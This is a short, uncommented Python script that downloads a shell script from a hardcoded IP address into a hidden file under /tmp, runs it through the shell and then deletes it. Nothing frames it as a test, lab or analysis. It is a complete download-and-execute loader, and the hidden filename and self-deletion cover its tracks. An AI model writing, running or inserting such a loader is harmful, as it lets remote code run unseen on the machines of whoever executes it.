import os
import subprocess
import urllib.request

def main():
    url = "http://198.51.100.7/p.sh"
    path = "/tmp/.x.sh"
    urllib.request.urlretrieve(url, path)
    subprocess.call("sh " + path, shell=True)
    os.remove(path)

main()
